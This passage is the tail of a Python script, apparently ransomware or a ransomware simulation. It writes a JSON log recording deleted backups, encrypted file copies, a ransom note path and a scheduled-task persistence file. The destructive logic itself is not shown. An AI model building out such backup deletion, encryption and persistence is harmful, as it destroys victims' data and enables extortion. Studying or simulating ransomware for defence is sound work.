        json.dumps(
            {
                "deleted_backups": deleted,
                "encrypted_copies": records,
                "note": (directory / "RANSOM_NOTE.txt").as_posix(),
                "persistence": (STATE_DIR / "scheduled_tasks.json").as_posix(),
            },
            indent=2,
        )
        + "\n",
        encoding="utf-8",
    )
    return 0


if __name__ == "__main__":
